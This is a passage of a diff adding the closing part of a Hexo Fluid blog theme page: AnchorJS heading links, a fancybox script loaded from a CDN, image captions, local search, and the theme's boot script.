+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
